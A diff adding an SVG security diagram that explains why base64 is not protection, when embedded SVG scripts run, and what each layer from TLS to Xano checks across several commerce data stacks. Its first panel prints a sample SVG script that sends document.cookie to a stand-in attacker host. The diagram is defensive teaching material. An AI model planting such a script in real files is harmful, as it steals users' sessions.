@@ -1,0 +1,638 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 1600 4290" role="img" aria-labelledby="t d">
+<title id="t">SVG + base64: encoding is not a security boundary</title>
+<desc id="d">How an SVG file travels as base64, where it can run code, what TLS, Cloudflare, CORS, Xano, Elm and Rust each check along the request path, and definitions of base64, compiling, machine code and bare metal, TLS hop by hop across Next.js hydration and a CRM to Shopify data bus, JVM, iPaaS (SAP, Azure, Celigo, Magento) and Wasm stacks with Consent Mode v2 and idempotency keys, VM versus Docker and Kubernetes isolation and transport, and thirty-one security gaps with the control that closes each.</desc>
+<defs><style>
+ .h{font:700 20px Helvetica,Arial,sans-serif;fill:#000}
+ .sec{font:700 10px Helvetica,Arial,sans-serif;fill:#767676;letter-spacing:.2em}
+ .bt{font:700 13px Helvetica,Arial,sans-serif;fill:#000}
+ .b{font:11px Helvetica,Arial,sans-serif;fill:#000}
+ .g{font:11px Helvetica,Arial,sans-serif;fill:#767676}
+ .s{font:10px Helvetica,Arial,sans-serif;fill:#767676}
+ .lab{font:700 9px Helvetica,Arial,sans-serif;fill:#767676;letter-spacing:.1em}
+ .c{font:11px 'Courier New',Courier,monospace;fill:#000}
+ .cg{font:11px 'Courier New',Courier,monospace;fill:#767676}
+ .n{font:700 10px Helvetica,Arial,sans-serif;fill:#000;text-anchor:middle}
+ .box{fill:#fff;stroke:#000;stroke-width:1.5}
+ .gap{fill:#fff;stroke:#000;stroke-width:1.5;stroke-dasharray:5 4}
+ .rule{stroke:#000;stroke-width:.8;fill:none}
+ .ln{stroke:#767676;stroke-width:1.2;fill:none}
+ .ah{fill:#767676}
+</style></defs>
+<rect width="1600" height="4290" fill="#fff"/>
+<text class="h" x="60" y="52">SVG + BASE64 — ENCODING IS NOT A SECURITY BOUNDARY</text>
+<text class="g" x="60" y="76">how the bytes look</text>
+<path class="ln" d="M160,72H170"/><path class="ah" d="M176,72l-6,-4v8z"/>
+<text class="g" x="181" y="76">what each layer checks</text>
+<path class="ln" d="M300,72H310"/><path class="ah" d="M316,72l-6,-4v8z"/>
+<text class="g" x="321" y="76">what actually protects the data</text>
+<text class="s" x="1182" y="76">Dashed = a gap, not a design. Numbers match the list below.</text>
+<path class="rule" d="M60,96H1540"/>
+<text class="sec" x="60" y="126">ONE SVG, THREE WAYS IN — SAME BYTES, DIFFERENT RISK</text>
+<rect class="box" x="60" y="142" width="420" height="262"/>
+<text class="bt" x="80" y="168">1 · Source SVG: what the file says</text>
+<text class="c" x="80" y="198" xml:space="preserve">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</text>
+<text class="c" x="80" y="217" xml:space="preserve">  &lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot;/&gt;</text>
+<text class="c" x="80" y="236" xml:space="preserve">  &lt;metadata&gt;patient: J. Doe · MRN 0042&lt;/metadata&gt;</text>
+<text class="c" x="80" y="255" xml:space="preserve">  &lt;script&gt;</text>
+<text class="c" x="80" y="274" xml:space="preserve">    fetch(&#x27;https://evil.example/?c=&#x27;</text>
+<text class="c" x="80" y="293" xml:space="preserve">      + document.cookie)</text>
+<text class="c" x="80" y="312" xml:space="preserve">  &lt;/script&gt;</text>
+<text class="c" x="80" y="331" xml:space="preserve">&lt;/svg&gt;</text>
+<circle cx="456" cy="236" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="456" y="239.5">7</text>
+<circle cx="456" cy="255" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="456" y="258.5">3</text>
+<text class="g" x="80" y="380">SVG is XML: it can run code and carry data, not just pixels.</text>
+<path class="ln" d="M482,272H532"/><path class="ah" d="M538,272l-6,-4v8z"/>
+<text class="s" x="489" y="264">base64</text>
+<rect class="box" x="540" y="142" width="440" height="262"/>
+<text class="bt" x="560" y="168">2 · Base64 data URI: how it travels</text>
+<text class="c" x="560" y="198" xml:space="preserve">data:image/svg+xml;base64,</text>
+<text class="cg" x="560" y="217" xml:space="preserve">PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9z</text>
+<text class="cg" x="560" y="236" xml:space="preserve">dmciPgogIDxjaXJjbGUgY3g9IjUwIiBjeT0iNTAiIHI9IjQw</text>
+<text class="cg" x="560" y="255" xml:space="preserve">Ii8+CiAgPG1ldGFkYXRhPnBhdGllbnQ6IEouIERvZSDCtyBN…</text>
+<text class="b" x="560" y="296">· Same bytes, new alphabet: about 33% larger.</text>
+<text class="b" x="560" y="318">· Anyone decodes it in one line: atob(s).</text>
+<circle cx="956" cy="314" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="956" y="317.5">1</text>
+<text class="b" x="560" y="340">· “&lt;script” is no longer visible to a text filter.</text>
+<circle cx="956" cy="336" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="956" y="339.5">2</text>
+<text class="b" x="560" y="362">· Not encrypted, not signed, not validated.</text>
+<path class="ln" d="M982,272H1032"/><path class="ah" d="M1038,272l-6,-4v8z"/>
+<text class="bt" x="1040" y="160">3 · How it&#x27;s rendered decides if it runs</text>
+<rect class="box" x="1040" y="174" width="500" height="68"/>
+<text class="c" x="1056" y="196" xml:space="preserve">&lt;img src=&quot;data:image/svg+xml;base64,…&quot;&gt;</text>
+<text class="b" x="1056" y="215">Static image. Script does not run.</text>
+<text class="g" x="1056" y="232">Text and metadata are still readable.</text>
+<circle cx="1520" cy="192" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1520" y="195.5">7</text>
+<rect class="gap" x="1040" y="252" width="500" height="68"/>
+<text class="c" x="1056" y="274" xml:space="preserve">el.innerHTML = atob(b64)  ·  inline &lt;svg&gt;</text>
+<text class="b" x="1056" y="293">Script RUNS on your origin:</text>
+<text class="g" x="1056" y="310">cookies, tokens, PHI on the page.</text>
+<circle cx="1520" cy="270" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1520" y="273.5">3</text>
+<rect class="gap" x="1040" y="330" width="500" height="68"/>
+<text class="c" x="1056" y="352" xml:space="preserve">&lt;object&gt;, &lt;iframe&gt;, opening the .svg URL</text>
+<text class="b" x="1056" y="371">Script RUNS in the file&#x27;s origin.</text>
+<text class="g" x="1056" y="388">Same-origin uploads become XSS.</text>
+<circle cx="1520" cy="348" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1520" y="351.5">3</text>
+<path class="rule" d="M60,424H1540"/>
+<text class="sec" x="60" y="452">FOUR WORDS THAT GET CONFUSED — ONLY ONE OF THEM CHANGES WHAT CODE CAN DO</text>
+<rect class="box" x="60" y="468" width="355" height="164"/>
+<text class="bt" x="74" y="494">Base64</text>
+<text class="s" x="74" y="511">encoding</text>
+<text class="b" x="74" y="536">Rewrites any bytes as 64 text characters.</text>
+<text class="b" x="74" y="554">Reversible by anyone. Understands nothing.</text>
+<text class="b" x="74" y="572">Never fails, never checks, never hides.</text>
+<text class="cg" x="74" y="614" xml:space="preserve">PHN2ZyB4bWxucz0i… = &lt;svg xmlns=&quot;</text>
+<rect class="box" x="435" y="468" width="355" height="164"/>
+<text class="bt" x="449" y="494">Compile</text>
+<text class="s" x="449" y="511">Rust compiles to machine code or Wasm · Elm to JS</text>
+<text class="b" x="449" y="536">Translates source into a different program.</text>
+<text class="b" x="449" y="554">Type-checks and rejects unsafe programs.</text>
+<text class="b" x="449" y="572">One-way: comments and names are gone.</text>
+<text class="cg" x="449" y="614" xml:space="preserve">cargo build --release · elm make</text>
+<rect class="box" x="810" y="468" width="355" height="164"/>
+<text class="bt" x="824" y="494">Machine code</text>
+<text class="s" x="824" y="511">what the CPU actually runs</text>
+<text class="b" x="824" y="536">Binary instructions: an opcode plus operands,</text>
+<text class="b" x="824" y="554">specific to one chip family (x86-64, ARM64).</text>
+<text class="b" x="824" y="572">Not secret: objdump or Ghidra reads it back.</text>
+<text class="cg" x="824" y="614" xml:space="preserve">48 89 E5  =  mov rbp, rsp  (x86-64)</text>
+<rect class="gap" x="1185" y="468" width="355" height="164"/>
+<text class="bt" x="1199" y="494">Bare metal</text>
+<text class="s" x="1199" y="511">no operating system underneath</text>
+<text class="b" x="1199" y="536">Code runs straight on the hardware: firmware,</text>
+<text class="b" x="1199" y="554">bootloaders, microcontrollers. No files, no</text>
+<text class="b" x="1199" y="572">process isolation, no OS to contain a bug.</text>
+<text class="cg" x="1199" y="614" xml:space="preserve">#![no_std] · firmware/glb-parse</text>
+<circle cx="1150" cy="488" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1150" y="491.5">9</text>
+<text class="s" x="60" y="652">Bare metal is dashed: a memory bug there owns the whole device, so Rust memory safety and signed firmware (secure boot) carry all the weight.</text>
+<path class="rule" d="M60,674H1540"/>
+<text class="sec" x="60" y="702">THE REQUEST PATH — WHAT EACH LAYER CHECKS, AND WHAT IT DOESN&#x27;T</text>
+<rect class="box" x="60" y="720" width="230" height="282"/>
+<text class="bt" x="74" y="746">Browser · Elm</text>
+<text class="s" x="74" y="763">untrusted client</text>
+<text class="lab" x="74" y="792">CHECKS</text>
+<text class="b" x="74" y="812">pure view can&#x27;t fetch or store</text>
+<text class="b" x="74" y="830">ports are the only exit to JS</text>
+<text class="b" x="74" y="848">opaque types mask PII on screen</text>
+<path class="rule" d="M68,876H282" style="stroke:#ccc"/>
+<text class="lab" x="74" y="900">DOES NOT</text>
+<text class="g" x="74" y="920">a user editing the compiled JS</text>
+<circle cx="274" cy="916" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="274" y="919.5">8</text>
+<text class="g" x="74" y="938">or calling the API directly</text>
+<path class="ln" d="M292,861H302"/><path class="ah" d="M308,861l-6,-4v8z"/>
+<rect class="box" x="310" y="720" width="230" height="282"/>
+<text class="bt" x="324" y="746">TLS</text>
+<text class="s" x="324" y="763">between browser and edge</text>
+<text class="lab" x="324" y="792">CHECKS</text>
+<text class="b" x="324" y="812">encrypts data in transit</text>
+<text class="b" x="324" y="830">proves the server&#x27;s identity</text>
+<path class="rule" d="M318,876H532" style="stroke:#ccc"/>
+<text class="lab" x="324" y="900">DOES NOT</text>
+<text class="g" x="324" y="920">protect data at rest</text>
+<text class="g" x="324" y="938">hide data from the edge</text>
+<circle cx="524" cy="934" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="524" y="937.5">5</text>
+<path class="ln" d="M542,861H552"/><path class="ah" d="M558,861l-6,-4v8z"/>
+<rect class="box" x="560" y="720" width="230" height="282"/>
+<text class="bt" x="574" y="746">Cloudflare edge</text>
+<text class="s" x="574" y="763">Worker · WAF · CORS</text>
+<text class="lab" x="574" y="792">CHECKS</text>
+<text class="b" x="574" y="812">CORS: other sites&#x27; browser reads</text>
+<text class="b" x="574" y="830">WAF: known attack patterns</text>
+<text class="b" x="574" y="848">Worker: consent egress gate</text>
+<path class="rule" d="M568,876H782" style="stroke:#ccc"/>
+<text class="lab" x="574" y="900">DOES NOT</text>
+<text class="g" x="574" y="920">stop curl, servers or agents</text>
+<circle cx="774" cy="916" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="774" y="919.5">4</text>
+<text class="g" x="574" y="938">see inside base64</text>
+<circle cx="774" cy="934" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="774" y="937.5">2</text>
+<text class="g" x="574" y="956">keep plaintext from Cloudflare</text>
+<circle cx="774" cy="952" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="774" y="955.5">5</text>
+<path class="ln" d="M792,861H802"/><path class="ah" d="M808,861l-6,-4v8z"/>
+<rect class="box" x="810" y="720" width="230" height="282"/>
+<text class="bt" x="824" y="746">TLS Full (strict)</text>
+<text class="s" x="824" y="763">between edge and Xano</text>
+<text class="lab" x="824" y="792">CHECKS</text>
+<text class="b" x="824" y="812">re-encrypts to the origin</text>
+<text class="b" x="824" y="830">validates the origin certificate</text>
+<path class="rule" d="M818,876H1032" style="stroke:#ccc"/>
+<text class="lab" x="824" y="900">DOES NOT</text>
+<text class="g" x="824" y="920">apply in Flexible mode:</text>
+<circle cx="1024" cy="916" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1024" y="919.5">5</text>
+<text class="g" x="824" y="938">that&#x27;s plain HTTP to Xano</text>
+<path class="ln" d="M1042,861H1052"/><path class="ah" d="M1058,861l-6,-4v8z"/>
+<rect class="box" x="1060" y="720" width="230" height="282"/>
+<text class="bt" x="1074" y="746">Xano</text>
+<text class="s" x="1074" y="763">auth · tables · logs</text>
+<text class="lab" x="1074" y="792">CHECKS</text>
+<text class="b" x="1074" y="812">auth token on every call</text>
+<text class="b" x="1074" y="830">per-record precondition</text>
+<text class="b" x="1074" y="848">field encryption, if built</text>
+<path class="rule" d="M1068,876H1282" style="stroke:#ccc"/>
+<text class="lab" x="1074" y="900">DOES NOT</text>
+<text class="g" x="1074" y="920">scrub request history</text>
+<circle cx="1274" cy="916" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1274" y="919.5">6</text>
+<text class="g" x="1074" y="938">sanitize SVG uploads</text>
+<circle cx="1274" cy="934" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1274" y="937.5">3</text>
+<path class="ln" d="M1292,861H1302"/><path class="ah" d="M1308,861l-6,-4v8z"/>
+<rect class="box" x="1310" y="720" width="230" height="282"/>
+<text class="bt" x="1324" y="746">Rust service</text>
+<text class="s" x="1324" y="763">parser · egress</text>
+<text class="lab" x="1324" y="792">CHECKS</text>
+<text class="b" x="1324" y="812">memory safety, no unsafe</text>
+<text class="b" x="1324" y="830">ConsentGrant moved: single use</text>
+<text class="b" x="1324" y="848">Pii&lt;T&gt;: no Serialize, Debug redacts</text>
+<path class="rule" d="M1318,876H1532" style="stroke:#ccc"/>
+<text class="lab" x="1324" y="900">DOES NOT</text>
+<text class="g" x="1324" y="920">prove the rule is the right one</text>
+<text class="g" x="1324" y="938">types force a check, not a policy</text>
+<path class="rule" d="M60,1022H1540"/>
+<text class="sec" x="60" y="1050">TLS PROTECTS EACH HOP, NOT THE DATA — EVERY BOX BELOW DECRYPTS IT</text>
+<text class="bt" x="60" y="1086">A · Next.js compile: server render, then CSR hydration</text>
+<rect class="box" x="60" y="1100" width="267" height="104"/>
+<text class="bt" x="74" y="1124">Browser request</text>
+<text class="b" x="74" y="1150">cookie + URL sent over TLS</text>
+<text class="g" x="74" y="1172">consent banner hasn&#x27;t loaded yet</text>
+<text class="lab" x="74" y="1194">decrypts here</text>
+<circle cx="311" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="311" y="1121.5">12</text>
+<path class="ln" d="M328,1152H356"/><path class="ah" d="M362,1152l-6,-4v8z"/>
+<text class="s" x="345.0" y="1144" text-anchor="middle">TLS</text>
+<rect class="gap" x="363" y="1100" width="267" height="104"/>
+<text class="bt" x="377" y="1124">CDN · edge</text>
+<text class="b" x="377" y="1150">TLS ends; HTML may be cached</text>
+<text class="g" x="377" y="1172">plaintext: the cached copy</text>
+<text class="lab" x="377" y="1194">decrypts here</text>
+<circle cx="614" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="614" y="1121.5">11</text>
+<path class="ln" d="M631,1152H659"/><path class="ah" d="M665,1152l-6,-4v8z"/>
+<text class="s" x="648.0" y="1144" text-anchor="middle">TLS</text>
+<rect class="box" x="666" y="1100" width="267" height="104"/>
+<text class="bt" x="680" y="1124">Next server</text>
+<text class="b" x="680" y="1150">Server Components fetch on request</text>
+<text class="g" x="680" y="1172">NEXT_PUBLIC_ vars baked into bundle</text>
+<text class="lab" x="680" y="1194">decrypts here</text>
+<circle cx="917" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="917" y="1121.5">13</text>
+<circle cx="895" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="895" y="1121.5">12</text>
+<path class="ln" d="M934,1152H962"/><path class="ah" d="M968,1152l-6,-4v8z"/>
+<text class="s" x="951.0" y="1144" text-anchor="middle">TLS</text>
+<rect class="box" x="969" y="1100" width="267" height="104"/>
+<text class="bt" x="983" y="1124">Shopify / Xano API</text>
+<text class="b" x="983" y="1150">server-to-server TLS call</text>
+<text class="g" x="983" y="1172">plaintext: API request logs</text>
+<text class="lab" x="983" y="1194">decrypts here</text>
+<circle cx="1220" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1220" y="1121.5">6</text>
+<path class="ln" d="M1237,1152H1265"/><path class="ah" d="M1271,1152l-6,-4v8z"/>
+<text class="s" x="1254.0" y="1144" text-anchor="middle">TLS</text>
+<rect class="gap" x="1272" y="1100" width="267" height="104"/>
+<text class="bt" x="1286" y="1124">Browser hydrates</text>
+<text class="b" x="1286" y="1150">HTML + RSC payload carry the props</text>
+<text class="g" x="1286" y="1172">readable in View Source and caches</text>
+<text class="lab" x="1286" y="1194">decrypts here</text>
+<circle cx="1523" cy="1118" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1523" y="1121.5">10</text>
+<text class="bt" x="60" y="1246">B · CRM-to-Shopify cloud data bus</text>
+<rect class="box" x="60" y="1260" width="267" height="104"/>
+<text class="bt" x="74" y="1284">CRM · Xano</text>
+<text class="b" x="74" y="1310">customer and consent record</text>
+<text class="g" x="74" y="1332">plaintext: tables, request history</text>
+<text class="lab" x="74" y="1354">decrypts here</text>
+<circle cx="311" cy="1278" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="311" y="1281.5">6</text>
+<path class="ln" d="M328,1312H356"/><path class="ah" d="M362,1312l-6,-4v8z"/>
+<text class="s" x="345.0" y="1304" text-anchor="middle">TLS</text>
+<rect class="gap" x="363" y="1260" width="267" height="104"/>
+<text class="bt" x="377" y="1284">Queue · webhook table</text>
+<text class="b" x="377" y="1310">event row waits for the processor</text>
+<text class="g" x="377" y="1332">plaintext: payload stored at rest</text>
+<text class="lab" x="377" y="1354">decrypts here</text>
+<circle cx="614" cy="1278" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="614" y="1281.5">16</text>
+<path class="ln" d="M631,1312H659"/><path class="ah" d="M665,1312l-6,-4v8z"/>
+<text class="s" x="648.0" y="1304" text-anchor="middle">TLS</text>
+<rect class="box" x="666" y="1260" width="267" height="104"/>
+<text class="bt" x="680" y="1284">Cloudflare Worker</text>
+<text class="b" x="680" y="1310">transforms; reads Admin token from KV</text>
+<text class="g" x="680" y="1332">plaintext: in memory, in logs if printed</text>
+<text class="lab" x="680" y="1354">decrypts here</text>
+<circle cx="917" cy="1278" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="917" y="1281.5">17</text>
+<circle cx="895" cy="1278" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="895" y="1281.5">14</text>
+<path class="ln" d="M934,1312H962"/><path class="ah" d="M968,1312l-6,-4v8z"/>
+<text class="s" x="951.0" y="1304" text-anchor="middle">TLS</text>
+<rect class="box" x="969" y="1260" width="267" height="104"/>
+<text class="bt" x="983" y="1284">Shopify Admin API</text>
+<text class="b" x="983" y="1310">writes customer, tags, metafields</text>
+<text class="g" x="983" y="1332">plaintext: inside Shopify&#x27;s controls</text>
+<text class="lab" x="983" y="1354">decrypts here</text>
+<path class="ln" d="M1237,1312H1265"/><path class="ah" d="M1271,1312l-6,-4v8z"/>
+<text class="s" x="1254.0" y="1304" text-anchor="middle">TLS</text>
+<rect class="box" x="1272" y="1260" width="267" height="104"/>
+<text class="bt" x="1286" y="1284">Shopify webhook back</text>
+<text class="b" x="1286" y="1310">customers/update returns to the bus</text>
+<text class="g" x="1286" y="1332">must verify HMAC on the raw body</text>
+<text class="lab" x="1286" y="1354">decrypts here</text>
+<circle cx="1523" cy="1278" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1523" y="1281.5">15</text>
+<text class="s" x="60" y="1384">Each arrow is its own TLS session. Data is plaintext inside every box, so anything stored, cached, logged or rendered there is outside TLS&#x27;s protection.</text>
+<path class="rule" d="M60,1402H1540"/>
+<text class="sec" x="60" y="1430">SAME DATA, THREE STACKS — JVM MIDDLEWARE vs IPAAS vs WASM, WITH CONSENT MODE V2 AND IDEMPOTENCY KEYS</text>
+<text class="bt" x="60" y="1466">C · JVM stack: Salesforce, MuleSoft and Salesforce Commerce Cloud, feeding Google Merchant</text>
+<rect class="box" x="60" y="1480" width="343" height="104"/>
+<text class="bt" x="74" y="1504">Salesforce core · Apex</text>
+<text class="b" x="74" y="1530">Salesforce&#x27;s Java-based multi-tenant runtime</text>
+<text class="g" x="74" y="1552">governor limits bound each tenant; you can&#x27;t patch it</text>
+<text class="lab" x="74" y="1574">decrypts here</text>
+<circle cx="387" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="387" y="1501.5">19</text>
+<path class="ln" d="M404,1532H432"/><path class="ah" d="M438,1532l-6,-4v8z"/>
+<text class="s" x="421.0" y="1524" text-anchor="middle">TLS</text>
+<rect class="gap" x="439" y="1480" width="343" height="104"/>
+<text class="bt" x="453" y="1504">MuleSoft · Mule runtime</text>
+<text class="b" x="453" y="1530">Java on the JVM; DataWeave transforms payloads</text>
+<text class="g" x="453" y="1552">plaintext: payloads, logs, connector credentials</text>
+<text class="lab" x="453" y="1574">decrypts here</text>
+<circle cx="766" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="766" y="1501.5">18</text>
+<path class="ln" d="M783,1532H811"/><path class="ah" d="M817,1532l-6,-4v8z"/>
+<text class="s" x="800.0" y="1524" text-anchor="middle">TLS</text>
+<rect class="box" x="818" y="1480" width="343" height="104"/>
+<text class="bt" x="832" y="1504">SFCC B2C · server script</text>
+<text class="b" x="832" y="1530">JavaScript on Rhino, running inside the JVM</text>
+<text class="g" x="832" y="1552">one process sees all order and customer data</text>
+<text class="lab" x="832" y="1574">decrypts here</text>
+<circle cx="1145" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1145" y="1501.5">19</text>
+<circle cx="1123" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1123" y="1501.5">18</text>
+<path class="ln" d="M1162,1532H1190"/><path class="ah" d="M1196,1532l-6,-4v8z"/>
+<text class="s" x="1179.0" y="1524" text-anchor="middle">TLS</text>
+<rect class="gap" x="1197" y="1480" width="343" height="104"/>
+<text class="bt" x="1211" y="1504">Google Merchant API</text>
+<text class="b" x="1211" y="1530">products, audiences and conversions arrive</text>
+<text class="g" x="1211" y="1552">consent state is often lost in the transforms</text>
+<text class="lab" x="1211" y="1574">decrypts here</text>
+<circle cx="1524" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1524" y="1501.5">21</text>
+<circle cx="1502" cy="1498" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1502" y="1501.5">20</text>
+<text class="bt" x="60" y="1626">D · iPaaS stack: from SAP through Azure and Celigo to Magento (Adobe Commerce)</text>
+<rect class="box" x="60" y="1640" width="343" height="104"/>
+<text class="bt" x="74" y="1664">SAP S/4HANA · ABAP</text>
+<text class="b" x="74" y="1690">IDoc, BAPI/RFC and OData out of the ERP</text>
+<text class="g" x="74" y="1712">integration users often hold broad roles</text>
+<text class="lab" x="74" y="1734">decrypts here</text>
+<circle cx="387" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="387" y="1661.5">31</text>
+<circle cx="365" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="365" y="1661.5">29</text>
+<path class="ln" d="M404,1692H432"/><path class="ah" d="M438,1692l-6,-4v8z"/>
+<text class="s" x="421.0" y="1684" text-anchor="middle">TLS</text>
+<rect class="box" x="439" y="1640" width="343" height="104"/>
+<text class="bt" x="453" y="1664">Azure · Service Bus + Logic Apps</text>
+<text class="b" x="453" y="1690">duplicate detection on MessageId</text>
+<text class="g" x="453" y="1712">Key Vault + managed identity, not keys in config</text>
+<text class="lab" x="453" y="1734">decrypts here</text>
+<circle cx="766" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="766" y="1661.5">21</text>
+<path class="ln" d="M783,1692H811"/><path class="ah" d="M817,1692l-6,-4v8z"/>
+<text class="s" x="800.0" y="1684" text-anchor="middle">TLS</text>
+<rect class="gap" x="818" y="1640" width="343" height="104"/>
+<text class="bt" x="832" y="1664">Celigo integrator.io</text>
+<text class="b" x="832" y="1690">SaaS flows map and transform each record</text>
+<text class="g" x="832" y="1712">plaintext: retries and error records keep payloads</text>
+<text class="lab" x="832" y="1734">decrypts here</text>
+<circle cx="1145" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1145" y="1661.5">28</text>
+<path class="ln" d="M1162,1692H1190"/><path class="ah" d="M1196,1692l-6,-4v8z"/>
+<text class="s" x="1179.0" y="1684" text-anchor="middle">TLS</text>
+<rect class="gap" x="1197" y="1640" width="343" height="104"/>
+<text class="bt" x="1211" y="1664">Magento · Adobe Commerce</text>
+<text class="b" x="1211" y="1690">PHP; REST, GraphQL and RabbitMQ queues</text>
+<text class="g" x="1211" y="1712">checkout JavaScript is the Magecart target</text>
+<text class="lab" x="1211" y="1734">decrypts here</text>
+<circle cx="1524" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1524" y="1661.5">30</text>
+<circle cx="1502" cy="1658" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1502" y="1661.5">3</text>
+<text class="bt" x="60" y="1786">E · Wasm stack: from Shopify through a Cloudflare Worker and a Shopify Function to Google Merchant</text>
+<rect class="box" x="60" y="1800" width="343" height="104"/>
+<text class="bt" x="74" y="1824">Shopify · Customer Privacy API</text>
+<text class="b" x="74" y="1850">captures Consent Mode v2 at the storefront</text>
+<text class="g" x="74" y="1872">ad_user_data, ad_personalization, + storage</text>
+<text class="lab" x="74" y="1894">decrypts here</text>
+<circle cx="387" cy="1818" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="387" y="1821.5">20</text>
+<path class="ln" d="M404,1852H432"/><path class="ah" d="M438,1852l-6,-4v8z"/>
+<text class="s" x="421.0" y="1844" text-anchor="middle">TLS</text>
+<rect class="box" x="439" y="1800" width="343" height="104"/>
+<text class="bt" x="453" y="1824">Cloudflare Worker</text>
+<text class="b" x="453" y="1850">V8 isolate; consent gate before egress</text>
+<text class="g" x="453" y="1872">idempotency key = event ID, deduped</text>
+<text class="lab" x="453" y="1894">decrypts here</text>
+<circle cx="766" cy="1818" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="766" y="1821.5">21</text>
+<path class="ln" d="M783,1852H811"/><path class="ah" d="M817,1852l-6,-4v8z"/>
+<text class="s" x="800.0" y="1844" text-anchor="middle">TLS</text>
+<rect class="box" x="818" y="1800" width="343" height="104"/>
+<text class="bt" x="832" y="1824">Shopify Function · Rust compiled to Wasm</text>
+<text class="b" x="832" y="1850">no network, no files, an instruction limit</text>
+<text class="g" x="832" y="1872">GraphQL input in, a list of operations out</text>
+<text class="lab" x="832" y="1894">decrypts here</text>
+<circle cx="1145" cy="1818" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1145" y="1821.5">22</text>
+<path class="ln" d="M1162,1852H1190"/><path class="ah" d="M1196,1852l-6,-4v8z"/>
+<text class="s" x="1179.0" y="1844" text-anchor="middle">TLS</text>
+<rect class="box" x="1197" y="1800" width="343" height="104"/>
+<text class="bt" x="1211" y="1824">Google Merchant API</text>
+<text class="b" x="1211" y="1850">product upsert by offerId: a retry overwrites</text>
+<text class="g" x="1211" y="1872">conversions only if ad_user_data = granted</text>
+<text class="lab" x="1211" y="1894">decrypts here</text>
+<circle cx="1524" cy="1818" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1524" y="1821.5">21</text>
+<circle cx="1502" cy="1818" r="9" fill="#fff" stroke="#000" stroke-width="1.2" stroke-dasharray="3 2"/><text class="n" x="1502" y="1821.5">20</text>
+<text class="lab" x="60" y="1962">CONCERN</text>
+<text class="lab" x="260" y="1962">JVM: SFCC · SALESFORCE · MULESOFT</text>
+<text class="lab" x="680" y="1962">IPAAS: SAP · AZURE · CELIGO · MAGENTO</text>
